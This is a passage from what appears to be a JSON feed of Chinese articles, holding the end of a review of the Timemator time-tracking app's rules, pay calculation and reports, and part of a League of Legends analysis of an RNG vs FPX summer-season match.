中，提供了文件夹和任务的概念用于创建记录事项。这里分享我的事项设置作为参考：</p>\n<ul>\n<li>日常居家： 居家、吃饭、个人护理、家务、做饭洗碗、睡觉</li>\n<li>外出活动： 逛街购物、聚会、交通、医院就医</li>\n<li>工作：主工作、斜杠工作</li>\n<li>运动： 散步、跑步、其他运动</li>\n<li>Better me：阅读、 学习探索、读书、学习、写作、复盘</li>\n<li>娱乐休闲：旅游游玩、电影电视、游戏、上网闲看、视频</li>\n</ul>\n<p>需要说明的是，并非一开始就必须设置这么多事项，其中大部分是在记录过程中新添加的。比如医院就医，是因为去医院看病，没有合适的事项才增加医院就医这一项，平时也是使用频率非常低的一类。</p>\n<p>所以只要几个能概括的大类和重点关注的方向就可以开始时间记录，之后过程中再根据实际需要逐渐细化，这会让开始的门槛变得更低。</p>\n<p>当事项逐渐变多时，就可以用文件夹来整理。在 Timemator 中，每个文件夹都可以自定义颜色。设置颜色后这个文件夹下的所有的任务都会使用这个主题色，在时间轴中能直观看到时间消耗。利用这个特性，我们可以根据事项的不同特点为其设置不同的主题色：</p>\n<ul>\n<li>红色和橙色：想要避免的事项，例如娱乐休闲，打游戏</li>\n<li>紫色：不太关注的事项，例如睡觉（其实有灰色更好，但没有这个选项就有点遗憾）</li>\n<li>蓝色：日常需要关注的事项，例如工作、交通</li>\n<li>绿色：鼓励和提倡的事项，例如读书、家务、复盘</li>\n</ul>\n<p>这是我一周的记录，可以一眼看到各类事项时间的分配。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/article/e467292f5f80a7b00b3f6a24b04c084e\"></figure><h2>最重要的核心功能——自动记录时间</h2>\n<p>在 Timemator for mac 中，最核心的一项功能是自动记录。它能自动记录我们在电脑上的所有操作，根据设定的规则自动匹配事项的时间。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/article/d53709205b2d98a10e9e99668ce3e8df\"></figure><p>Timemator 允许我们通过逻辑关系建立多个条件来匹配事项，设置也非常简单：只需要在主页事项右边的「闪电」按钮就可以进入，也可以在任务上右键选择「Edit Rules」。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/04/29/article/fd76f83f9978dde8ae73431c1e1727e5\"></figure><p>它提供的选项几乎能涵盖任何电脑上的操作，甚至连浏览不同网页和不同文件也可以轻易区分。</p>\n<p>它支持多种事件，包括：</p>\n<ul>\n<li>启动某个程序：当打开一个程序之后启动计时，如果之后没有触发其他规则将一直保持计时状态；</li>\n<li>激活某个程序的窗口：当前停留在某个程序界面时候启动计时，如果切换到其他程序则停止；</li>\n<li>打开某个文件：打开一个文件之后启动计时，如果切换到其他窗口则停止；</li>\n<li>打开某个文件夹下的文件：打开的文件属于指定的文件夹时启动计时，切换到其他窗口时停止；</li>\n<li>当前窗口的标题：当前程序窗口的标题符合规则时启动计时，如果切换到其他窗口则停止（但由于很多 app 并不能直接知道窗口的标题，所以可以在系统工具「活动监视器」中查找当前窗口的标题）；</li>\n<li>打开指定网站 URL：在浏览器中浏览指定的网页地址时启动计时，切换到其他窗口时停止。</li>\n</ul>\n<p>而这些事件还可以设置更精细的匹配规则，使规则设置更灵活，满足更多场景。例如打开指定网站 URL 的规则，可以设置包含关键词或者以某个关键词开头或结尾。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/article/5939af0c56124b2c4e0a86cdaf77e0d3\"></figure><p>下图是创建一个浏览少数派网站的规则，为了能记录下所有少数派的页面，可以指定访问的 URL 包含「sspai」关键词，这样基本所有少数派相关的页面都能记录到。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/aa631024fa1fa30bfdcaf6f93c89c911.gif\"></figure><p>如果某个事项可以被多个操作触发，则可以创建多条规则，只要满足其中一条，即可触发自动记录。这是我为主工作设置的匹配事项，当打开工作相关的程序、文件和网页时，都会启动计时。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/article/9afe7141a656b5bab1109da110a7fb6c\"></figure><p>网页和文件名都可以用「contains」 来表示包含某些关键词，还可以使用正则表达式来匹配文件名。很多时候工作文件都有相同的命名规则，Timemator 就能根据文件名判断现在是不是在工作。</p>\n<p>是想要自动记录正常工作，需要给 Timemator 开启系统辅助功能的权限，在「系统偏好设置-安全性与隐私」中，找到辅助功能，勾选 Timemator 即可。首次开启自动记录，timemator 也会很人性化地引导我们开启这个权限。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/article/535282b8f201c7f3899a09b5c479c338\"></figure><p>一切设置好后，自动记录就会开始工作，不需要额外的点击或其他操作。</p>\n<p>值得注意的是，如果当前手动开启了一个计时任务时，自动记录不会立刻开始。直到手动关闭当前的计时任务之后，Timemator 才会启动自动记录。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/92a8b7361e7fc0a9452e08b4c7f4ad3b.gif\"></figure><p>如果你想临时停止某个规则，则可以在其激活的时候手动暂停关闭它。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/04/29/article/8b496dd4936433aa3f04e2ba51a8599b\"></figure><p>除了强大的匹配规则，自动记录的体验也设计的恰到好处。你会发现在规则触发并不是实时的，而是会等待几秒钟才触发，这个设计非常巧妙。</p>\n<p>在触发和停止规则的前后都可以指定一个「安全时间」。在这个时间范围内依然会保持当前记录的事项。如果你正在编辑文档的时候收到了微信消息，那么短暂回复消息的几秒钟其实并没有必要记录，更不想因此打断当前的连续工作时间。所以 Timemator 会默认设置一个 10 秒的安全时间，这确实会让最终呈现出来的报告可读性更好。</p>\n<p>在安全时间的范围内，状态栏会展示一个倒计时进度条，可以很直观了解当前的状态，同时也给我们一个提醒：不要轻易打断当前的工作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/article/52de4ab6e706b8c8dd6d550bad410f2e\"></figure><p>开启自动记录后，Timemator 会默认将所有操作记录都保存下来，那些没有匹配到规则的操作也会被存储起来，这样如果我们增加了新的匹配规则，就可以很轻松地恢复当天的记录。</p>\n<p>另外在单日报告中，对于占用时间较多的没有匹配的事项，鼠标悬停还会弹出分配到记录事项的提示，可以一键将时间分配到自己的记录事项中去，确实省心了不少。有了这个功能，更不用担心自己规则设置不完善了，完全可以放心记录，之后再补充匹配规则。</p>\n<h2>基础功能之上的撒手锏——自动计算工作薪酬</h2>\n<p>Timemator 支持自动计算按时间付费的工作报酬，可以对任务设定一个时薪，在报表中就会自动统计出报酬总额。除此之外还可以在统计报表中标记是否已支付，考虑得很周到。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/81334aee94fdab50e43b6b63f9e2c078.png\"></figure><p>例如我的业余工作是按小时计费的，那么我可以为它设置一个每小时30元的时薪，在任务上右键选择编辑即可打开设置。Timemator 的默认货币是美元，在设置中可以任意切换成其他货币，我已经提前设置为人民币了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/2164091893e66db872ef6a6b1d55768b.png\"></figure><p>设置好时薪后，在统计报告中就能自动计算一段时间的总计收入。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/b8b315dda7f2967e70232f477fbb1e37.png\"></figure><p>如果想要计算哪些是已经支付过的话，切换到列表视图就可以对已经完成的工作进行标记，可以设置为已经出账或者已经支付，便于自己核对收入。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/e79de51f836b45980ec4c394e5c66bc0.png\"></figure><p>不过这种计算时薪的工作多在远程办公和兼职的场景出现，在国内会显得更小众一些。即便没有记时付费的工作，其实还可以利用这个功能算算自己浪费的时间价值。给那些被浪费的时间定个价，比如一小时 20 元，一个月之后看看自己白白浪费了多少价值，也算是对自己的一个反向激励。</p>\n<h2>移动端同步——和 iOS 端配合记录</h2>\n<p>除了 Mac 端之外，Timemator 同时支持 iOS 端，iOS 端的功能非常齐全，和 Mac 端几乎一致。它们的数据通过 iCloud 同步，在一端开启的计时也会及时同步到另一端。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/9bbebfdb7210ee8ded6cba5895947646.png\"></figure><p>不像 Mac 端可以对电脑操作进行自动记录，iOS 端就没有这个功能了，所有的计时操作都需要手动启动和停止。但使用移动端最大的好处，是不受地域限制随时记录。Mac 端更适合记录电脑上的工作，和 iOS 端结合就可以把一天24小时所有事情都记录下来，这对于养成时间记录的习惯来说至关重要。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/04/29/58f98260ceaa6e721b365b8008f55f9c.png\"></figure><p>并且移动端有一个美观的桌面小组件，放在主屏上的小组件不仅能显示当前记录的时间，也能避免我们忘记切换当前事项。</p>\n<h2>不只是记录——使用 Report 定期回顾</h2>\n<p>在记录一段时间之后，就可以查看我们记录的成果了。 Timemator 提供了完善的统计功能，支持导出 CSV 和 PDF 文件，便于分享和二次分析。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/b9c02a40aeafda99480c6ceaf792867b.png\"></figure><p>统计功能主要是围绕两个维度进行数据呈现，一个是时间，另一个则是事项。我们可以按天、周、月、年，甚至是自定义任意时间范围查看统计数据，也可以指定只查看某些事项的统计数据。围绕这两个维度，大部分的统计和分析需求都能满足。</p>\n<p>通常我习惯按周回顾数据，每周一的早上都会抽时间查看上周的时间记录，Timemator 默认的周视图可以以一种非常直观的方式看到时间分配情况，由于前期对不同事项分配了颜色，几乎可以毫不费力的了解一整周的时间分配。</p>\n<p>在右侧的事项列表可以查看每个事项的小时数，大部分情况下这些数据就足够了。在每天的柱图顶部还有比较小的文字显示当天累计记录的时间。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/6f583d384e144e21384524066685af7b.png\"></figure><p>除了柱状图模式，还可以切换到列表模式查看具体事项的记录，不过这个功能我用的并不多，更多是在查看具体某一天的时间安排时会用到。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/2c393fe895d736cc949255f1d8051517.png\"></figure><p>美中不足的就是 Timemator 没有提供饼图，不能很方便查看各事项的时间分配占比，但可以通过导出的 csv 自己在 Excel 中分析。</p>\n<h2>写在最后</h2>\n<p>Timemator 功能固然强大，但重要的是时间记录本身，我们更需要理解时间记录的意义和价值。</p>\n<p>时间记录并不是时间管理中必不可少的一环，但它却能用最简单的方式，帮我们合理规划时间。一个好工具能让自己更享受记录的过程，时间记录的终极目标仍然是为了让自己变得更好，了解自己，成就更好的自己。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/66354"},{"title":"S11夏季赛RNGvsFPX复盘：英雄池差距与运营差距的比赛","date":"2021-06-28 16:15:08","description":"\n<p>大家好，我是尹天，这里是尹天的复盘系列，久违了。</p>\n<p>夏季赛到今天都没怎么写复盘，主要是因为比赛质量低下，难以提起兴趣。故在看完FPX和RNG的第一局之后，我立刻意识到，今晚应该闲不下来了。</p>\n<p>在第一局，FPX展现了当前版本几乎不可能完成的运营：拖住中期劣势。在面对有着优秀运营底子的RNG时 能完成这一点，足以证明FPX目前上限之高。所以，今天关于FPX的内容，我会主要分析他们的运营部分，对于一些亮眼操作可能会放过去。</p>\n<p>在RNG的部分，我会着重讨论他们前中期的兵线理解、BP困境（也就是英雄池困境），或许会嘴一下选手的操作。重点是1、2局，第三局纯粹个人打的太差，没有分析价值。</p>\n<hr>\n<h2>第一局</h2>\n<h3>一、BP分析</h3>\n<p>在开始讨论BP之前，我们先来看一下双方对Ban位的理解。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-50c823315f169a8e97bca3996ebfec32_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1816\" data-rawheight=\"442\" class=\"origin_image zh-lightbox-thumb\" width=\"1816\" data-original=\"https://pic3.zhimg.com/v2-50c823315f169a8e97bca3996ebfec32_r.jpg\"></figure><p>双方今晚，RNG三把蓝，三局一轮ban阿卡丽、锤石、赛娜。FPX三把红，三局一轮banEZ、赵信、卢锡安。双方的BP策略根本方向上是一致的，只是大方向有所不同。</p>\n<p>我们来看看，双方为什么采用如此一致的第一轮BP策略。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-e658a0ec5dcfa0fb12068a5edb77ae11_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1754\" data-rawheight=\"822\" class=\"origin_image zh-lightbox-thumb\" width=\"1754\" data-original=\"https://pic2.zhimg.com/v2-e658a0ec5dcfa0fb12068a5edb77ae11_r.jpg\"></figure><p>在RNG这边，FPX的赛娜是首先要解决的点。目前FPX是联盟中最多次使用赛娜战术的队伍，Lwx五次选用赛娜，胜率80%。赛娜战术是目前快节奏版本里，唯二可以打大后期的下路组合（另外一个是大嘴露露），而且因为塔姆补刀所以中期战斗力更强。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-f08f7949af242e43e7beb05c2d4ca936_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1540\" data-rawheight=\"1050\" class=\"origin_image zh-lightbox-thumb\" width=\"1540\" data-original=\"https://pic3.zhimg.com/v2-f08f7949af242e43e7beb05c2d4ca936_r.jpg\"></figure><p>目前，赛娜处于一个多数队伍不太会用，但是只要敢选就很容易打出效果的状态。</p>\n<p>夏季赛到现在，赛娜选用场次只有13场，不多，但是胜率却有69.2%，是使用场次排名前五的AD里胜率最高的。当对上擅长使用赛娜体系的队伍时，赛娜是必须承担的Ban位。</p>\n<p>至于阿卡丽，因为Doinb近期阿卡丽表现不错，而Cryin不会阿卡丽无法自己选，所以蓝色开阿卡丽会是相当糟糕的做法。另外，多说一句，RNG到目前为止，只开过两次阿卡丽。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-a1271a37e1529e875d25322baa6e251d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2074\" data-rawheight=\"944\" class=\"origin_image zh-lightbox-thumb\" width=\"2074\" data-original=\"https://pic2.zhimg.com/v2-a1271a37e1529e875d25322baa6e251d_r.jpg\"></figure><p>就是打OMG的两场，然后被阿卡丽绝活选手Creme操作了一通。</p>\n<p>而关于锤石，这一点似乎FPX在之前比赛中没有表现太多的重视，无论是被ban还是自选，次数都很少。</p>\n<p>唯一比较合理的解释是，FPX和WE的比赛中，FPX第二局拿出厄斐琉斯锤石的下路组，而RNG认为他们没有办法破解类似组合，参照RNG对LNG第一局LNG的金克丝锤石。RNG自己选金克丝锤石并没有取得胜利，在无法破解+无法选用的情况下，锤石自然只能ban掉。</p>\n<p>然后是FPX。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-4da6309a88208241e49c8d9f55387e1e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1216\" data-rawheight=\"460\" class=\"origin_image zh-lightbox-thumb\" width=\"1216\" data-original=\"https://pic3.zhimg.com/v2-4da6309a88208241e49c8d9f55387e1e_r.jpg\"></figure><p>EZ是GALA夏季赛使用最多的英雄，场次上完全超过其他。而在BLND%（先选率）上，RNG仅仅在给GALA选EZ时，会尝试比对面AD先选，其他所有英雄到目前都是对位后选。可以说，目前EZ是RNG和GALA最自信的下路体系，有ban的价值。</p>\n<p>卢锡安我不用多说，赵信也很简单，赵信+卡尔玛是RNG在夏季赛唯一赢得比赛的体系，虽然因为对手是RW而导致含金量不足，但毕竟是RNG最自信的体系，尊重一手完全没有问题。</p>\n<p>这样一来，鳄鱼和盲僧再度被双开出来：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-c6376ea84456daa1b8921cf9f9bbc747_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2710\" data-rawheight=\"1516\" class=\"origin_image zh-lightbox-thumb\" width=\"2710\" data-original=\"https://pic4.zhimg.com/v2-c6376ea84456daa1b8921cf9f9bbc747_r.jpg\"></figure><p>1、第一轮BP</p>\n<p>RNG拿走鳄鱼，FPX对着拿走兰博+盲僧。</p>\n<p>鳄鱼的优先级大于盲僧，在对上线的情况下鳄鱼算是处理盲僧的选择之一，所以职业队伍会在开盲僧的情况下先抢鳄鱼，OMGvsBLG、TTvsUP都采用这样的策略来进行兑子。</p>\n<p>在11.12版本UD被砍以后，目前打野T1就是赵信、兰博、皎月，优先级为赵信＞兰博=皎月。在没有赵信的情况下，兰博皎月可以看情况来拿，皎月适合冲阵体系，兰博适合配poke和一些偏阵地战的阵容。</p>\n<p>RNG对着拿走皎月，然后选出上单格温，确定鳄鱼给中，符合大家对RNG英雄池的一贯预期。FPX第三手拿走瑟提，做一个摇摆位。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>2、第二轮BP</p>\n<p>FPXban露露、卡莎，限制RNG下路组合选择。RNGban梦魇、武器，他们担心瑟提会摇去辅助，限制掉一些可以操作上单格温的英雄。</p>\n<p>在场上主流AD已经没多少的情况下，FPX先拿走维鲁斯，没问题。RNG对着拿滑板鞋+泰坦，这个组合就算你下路是维鲁斯+瑟提，配合打野一样可以将维鲁斯击杀，展露出了极强的希望打下半区的意图。</p>\n<p>这时候FPX也没什么办法，瑟提不敢再放在下路，不然维鲁斯指定没什么好果汁吃，必须要拿塔姆来保护维鲁斯，那么瑟提就只能摇去上路。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>3、阵容评价</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-249d8052ef13f1a7d0746a5457fe510f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2714\" data-rawheight=\"1506\" class=\"origin_image zh-lightbox-thumb\" width=\"2714\" data-original=\"https://pic4.zhimg.com/v2-249d8052ef13f1a7d0746a5457fe510f_r.jpg\"></figure><p>从对线上来说，上路格温小劣，中路鳄鱼优势，下路滑板鞋+泰坦3级后更容易拿到线权。</p>\n<p>RNG的阵容中野极度强势，鳄鱼+皎月基本是当前版本最强中野，双稳定控制让这个组合下限极高，这一点优于盲僧+兰博。RNG需要利用中野的优势，尽可能的去多游走下路，利用下路多重稳定控制打开局面，进而解放泰坦，中期利用滑板鞋的强势期带动节奏，快速拿下比赛。</p>\n<p>FPX的阵容更依赖上野配合，瑟提+兰博的组合下限也很高，所以他们更依赖上野优势尽快打穿，把格温打成极度劣势的情况，劣势格温用处很小。然后再通过上半区的优势辐射下路，中期利用兰博的强势点在地图资源上进行团战，快速滚雪球拿下比赛。</p>\n<p>理论分析是这样，但是两队很快打成了完全相反的样子。。。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>二、对局分析</h3>\n<p>我们分两个部分：前期双方打野博弈、中期FPX运营思路</p>\n<p>1、前期打野博弈：上单如何打乱打野节奏？</p>\n<p>为什么在职业赛场上，被单杀是超出底线的失误？因为这不仅仅会让你线上受损，更会让整个团队的战术布置失效。</p>\n<p>我们从1级开始说。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-2933f264ea30c54a00e9a9a08e31198e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"392\" data-rawheight=\"388\" class=\"content_image\" width=\"392\"></figure><p>双方1级都在RNG的红区做了视野，不同的是FPX先做，而RNG后做。</p>\n<p>这样一来，RNG就有了应对该视野的机会，Ming回家出了个扫描，和AD一起把眼排掉，Wei直接蓝开。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-18827272e785a2f40ae35b4c9218b87e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"394\" data-rawheight=\"390\" class=\"content_image\" width=\"394\"></figure><p>蓝开的Wei让FPX很不安，他们在上半地图全无视野，不知道Wei到底是什么路线。FPXping了两个BUFF，意思就是不确定Wei会不会来换野区。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-c4a2f621bc637ae54a98139c3863ab97_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"402\" data-rawheight=\"406\" class=\"content_image\" width=\"402\"></figure><p>随后，鳄鱼利用前期推线的优势，率先把兵线推了过去并做了一个F6视野。这个在视野教学中和大家提到过，是一个中单有线权时，非常好用的F6眼位。</p>\n<p>通过这个眼，RNG确定，兰博是清半区的刷野思路。而看到鳄鱼离开线上，FPX立刻产生警觉，此时如果皎月和优势兵线的鳄鱼去上半区，第一时间FPX中野一定会更慢，因为盲僧没有线权。</p>\n<p>加上刚刚不确定皎月的路线，兰博索性直接往下半区走，他想确定皎月的路线。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-b24f07c76a3d5ca2821b0d9c957bc35b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"400\" data-rawheight=\"392\" class=\"content_image\" width=\"400\"></figure><p>虽然因此确定了皎月的刷野路线，但兰博的路线也被RNG完全确定。</p>\n<p>我们回顾一开始的开野顺序，RNG往下，是想保护下半区。因为前三级兵线优势在FPX手里，所以3级以后，兵线要么在塔前，要么推进去开始回流，打野抓下是最佳机会。所以你看，FPX的辅助去三角草做了一个眼，就是想保护对线。</p>\n<p>相对的，去上的FPX想保护上半区，同样的道理，瑟提前3级有线权，所以只要兵线推进去，三级以后兵线回流，打野速4是正好抓到的。可是小虎没有在上半区做眼，所以Tian这波很有机会抓到。</p>\n<p>两队节奏都布置的很有条理，但是Nuguri被单杀，直接让这个平衡被打破。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-8dae5d6b2ed7a1aa2e2e6b8aba44e74f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1534\" data-rawheight=\"1070\" class=\"origin_image zh-lightbox-thumb\" width=\"1534\" data-original=\"https://pic4.zhimg.com/v2-8dae5d6b2ed7a1aa2e2e6b8aba44e74f_r.jpg\"></figure><p>注意时间，3分16。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-db2f958b39388a11baf9a80e60ee6f54_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"396\" data-rawheight=\"398\" class=\"content_image\" width=\"396\"></figure><p>3分16是正常打野完成速4的时间点，此时刷的比较快的一般都刷完四组，大家可以参照一直在刷野没停过的Wei，他就是正好此时速4。如果Nuguri能晚十五秒出问题，兰博就能打完红去上，他就不会死，兰博的刷野路线就能有所收获。</p>\n<p>随着上单阵亡，Tian和Doinb立刻调整路线。因为Ming把Crisp的三角草视野排掉，Wei打算去三角草看看情况，而发现眼被拆掉的Doinb立刻往下走，Tian也放掉石甲虫转而去下，双方的重点立刻聚焦在下路。</p>\n<p>此时，中路兵线被盲僧推进去，即将呈现回推。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-98c93d20e91ff96542eb4dd466a572ae_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1944\" data-rawheight=\"1012\" class=\"origin_image zh-lightbox-thumb\" width=\"1944\" data-original=\"https://pic3.zhimg.com/v2-98c93d20e91ff96542eb4dd466a572ae_r.jpg\"></figure><p>3分33，RNG在下路收获人头。滑板鞋泰坦前期爆发太高了。鳄鱼看到盲僧下来也交T保队友，没什么问题。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-06d93dbaae5efe4f0005247c58880bf9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"388\" data-rawheight=\"384\" class=\"content_image\" width=\"388\"></figure><p>从打完红到3分33，时间足够兰博走到下路，顺便刷河道蟹。对于没有视野的RNG来说，正常的兰博都会走石甲虫-河道蟹的路线，他们完全没想到兰博会绕道来下。</p>\n<p>你看，第一时间，状态还有一半的皎月在回城，没人想得到T下来的鳄鱼会出事。</p>\n<p>此时，中路兵线正在回推。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-f806714353cf013fd6aac94b870b48e7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"406\" data-rawheight=\"406\" class=\"content_image\" width=\"406\"></figure><p>等到盲僧走回线上，一波无比巨大的回推线等着他吃，鳄鱼走到线上会亏至少两波兵线的经验，中路对线基本结束了，战士打战士，最不能接受的就是落后等级。</p>\n<p>这波鳄鱼T下路支援有没有问题？我认为没有，更多是Tian反思维的路线做的好，RNG不可能考虑得到Tian会来下半区，他们完全没有考虑到Tian可能的蹲伏。</p>\n<p>然后Nuguri又被小虎单杀了。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-267002cad4c09f1208785babbb4fa43a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"392\" data-rawheight=\"402\" class=\"content_image\" width=\"392\"></figure><p>这波单杀之前，兰博路线是先去上刷留下来的石甲虫，然后继续往下，Tian很细节地把原本完全相反的打野路线调整到和Wei平齐，这样可以保证一定能在下路蹲到Wei的下一次进攻，大家能看到皎月头像上面的红色方问号，这就是Tian调整打野路线的意义。</p>\n<p>这种情况下，上路一定不能出事，出了事儿没有人能来帮的。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-02dd80d68f687394eb430220f6c4fe68_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1048\" data-rawheight=\"952\" class=\"origin_image zh-lightbox-thumb\" width=\"1048\" data-original=\"https://pic1.zhimg.com/v2-02dd80d68f687394eb430220f6c4fe68_r.jpg\"></figure><p>结果就出事了。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-a81d689858eb3aae0b4216e3e1e752d6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"402\" data-rawheight=\"398\" class=\"content_image\" width=\"402\"></figure><p>出事儿的同时，中路Doinb推了线以后没去游走，反而是跟鳄鱼塔下操作了一波，双方互相残血。</p>\n<p>那么Tian的时间就被浪费了，他在下路蹲了很久很久。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-1b80f56864f49fabee35da1adc78aee5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"410\" data-rawheight=\"398\" class=\"content_image\" width=\"410\"></figure><p>Wei是没有反蹲的，他刷完直接回家，此时Wei领先Tian一个回城再出来的20秒左右时间。Wei利用这个时间排干净了上半区红色方视野，同时率先开始刷自己的野区。</p>\n<p>面对打野落后的局面，FPX变招很快，他们准备把辅助调来上半区。同时，因为上半区的两次被单杀，Tian再次更改自己的刷野路线，选择蓝-石甲虫，再度回到以上路为中心，牺牲掉好不容易对应起来的往下的路线。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-bf9912c401d04057edea0f8ff10a2da1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"408\" data-rawheight=\"410\" class=\"content_image\" width=\"408\"></figure><p>因为皎月拆了眼，所以FPX判断草丛有视野，塔姆贴着墙壁走，绕过了这个草丛没有被RNG发现。那么这波塔姆的存在就是FPX对RNG的信息差，很容易利用这个信息差做到事情，至少可以排掉RNG上半区的视野。</p>\n<p>问题是，Nuguri在皎月已经在上半区拆眼的情况下，他完全没考虑打野来抓自己的可能。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-c5a53345bcd5d14937a993e158cb78cc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1388\" data-rawheight=\"1024\" class=\"origin_image zh-lightbox-thumb\" width=\"1388\" data-original=\"https://pic1.zhimg.com/v2-c5a53345bcd5d14937a993e158cb78cc_r.jpg\"></figure><p>压线太深，眼看到皎月的时候已经晚了。</p>\n<p>这三波小虎打的都很好，该拼就拼该卖就卖。但是Nuguri被击杀三次无论如何都说不过去，因为他，FPX第一波向上的路线没有收益，第二波好不容易把路线调整和RNG一样，又要为了上半区调回去，而塔姆支援的信息差也没能获得人头收益，仅得到一个先锋。</p>\n<p>这就是单杀的最大不利后果：队友的战术被迫围绕你来走，而很多东西执行到一半因为你的阵亡而无法取得收益。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>2、中期运营思路：FPX是怎么拖住的？</p>\n<p>FPX中期能拖住的关键，是他们在交换资源上做的非常好。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-b950fe3ecebe6e3868bd7b77029073ee_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"398\" data-rawheight=\"400\" class=\"content_image\" width=\"398\"></figure><p>在队友劣势的情况下，Doinb没有贸然去支援。比如这波三个人想去上路抓Nuguri，但是全都失败了，不过Doinb一开始就没打算去，他决定留在中路，利用先锋去吃了两个镀层。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-b81db777e405125d3882e9ea2cecef30_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"402\" data-rawheight=\"406\" class=\"content_image\" width=\"402\"></figure><p>或者是在鳄鱼离开线上以后，偷吃RNG的F6。</p>\n<p>在他不断偷发育偷经济的时候，处于攻势的RNG来了一波有点问题的兵线运营：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-68f395fe094c2d40db20089148e51fb7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"398\" data-rawheight=\"396\" class=\"content_image\" 